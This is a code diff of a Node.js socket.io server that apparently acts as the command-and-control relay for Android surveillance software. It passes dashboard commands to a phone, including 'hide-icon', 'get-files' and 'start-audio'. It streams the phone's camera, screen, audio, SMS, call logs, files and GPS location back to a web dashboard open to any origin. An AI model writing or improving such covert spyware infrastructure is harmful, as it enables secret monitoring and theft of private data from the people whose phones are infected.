@@ -1,81 +1,40 @@
-const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const path = require('path');
 
-const app = express();
-const server = http.createServer(app);
-
-// Increase the limit for large Base64 strings (essential for 30 FPS streams)
+const server = http.createServer();
 const io = new Server(server, {
-    maxHttpBufferSize: 1e8, // 100 MB
     cors: {
-        origin: "*",
-    }
-});
-
-// Serve the dashboard files from the "public" directory
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Standard route for the dashboard
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+        origin: "*", // Allows your HTML dashboard to connect from any source
+        methods: ["GET", "POST"]
+    },
+    maxHttpBufferSize: 1e7 // Increases buffer size to 10MB for high-res screen frames
 });
 
 io.on('connection', (socket) => {
     console.log('New connection:', socket.id);
 
-    // Identify if the connection is from the Device or the Web Dashboard
-    socket.on('register', (type) => {
-        socket.join(type); // Joins 'device' room or 'web' room
-        console.log(`Socket registered as: ${type}`);
-    });
-
-    /** * COMMAND ROUTING: Web -> Device
-     * Relays commands like 'stream:0:video', 'get-files', or 'hide-icon'
-     */
-    socket.on('phone-execute', (cmd) => {
-        console.log('Command received from web:', cmd);
-        io.to('device').emit('phone-execute', cmd); 
-    });
-
-    /**
-     * DATA RELAY: Device -> Web
-     * Relays the 30 FPS frame data for Camera and Screen streams
-     */
+    // 1. RECEIVE DATA FROM ANDROID
+    // Screen frames
     socket.on('data-stream', (base64Data) => {
-        // High-frequency relay to all connected dashboard clients
-        io.to('web').emit('data-stream', base64Data);
+        // Broadcast to all connected dashboards
+        socket.broadcast.emit('data-stream', base64Data);
     });
 
-    /**
-     * FILE EXPLORER RELAY: Device -> Web
-     * Relays the JSON file list for the Windows-style explorer
-     */
-    socket.on('file-data', (jsonFiles) => {
-        io.to('web').emit('file-data', jsonFiles);
+    // Audio chunks
+    socket.on('audio-stream', (audioBase64) => {
+        socket.broadcast.emit('audio-stream', audioBase64);
     });
 
-    /**
-     * DOWNLOAD RELAY: Device -> Web
-     * Relays the actual file buffer as Base64 for the browser to download
-     */
-    socket.on('file-download-ready', (fileObj) => {
-        io.to('web').emit('file-download-ready', fileObj);
-    });
-socket.on('call-data', (data) => {
-    io.to('web').emit('call-data', data);
-});
-    /**
-     * SYSTEM STATUS RELAY: Device -> Web
-     * Relays Battery level and GPS coordinates
-     */
-    socket.on('battery-update', (val) => {
-        io.to('web').emit('battery-update', val);
+    // SMS/Call Logs/Location
+    socket.on('device-data', (payload) => {
+        socket.broadcast.emit('device-data', payload);
     });
 
-    socket.on('location-update', (locData) => {
-        io.to('web').emit('location-update', locData);
+    // 2. RECEIVE COMMANDS FROM DASHBOARD
+    socket.on('command', (cmd) => {
+        console.log('Sending command to device:', cmd);
+        // This sends the command (e.g., 'start-audio') to the Android app
+        socket.broadcast.emit('command', cmd);
     });
 
     socket.on('disconnect', () => {
@@ -83,8 +42,8 @@ socket.on('call-data', (data) => {
     });
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+const PORT = 3000;
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on port ${PORT}`);
+    console.log(`Your Dashboard IP is: http://YOUR_LOCAL_IP:${PORT}`);
 });
-
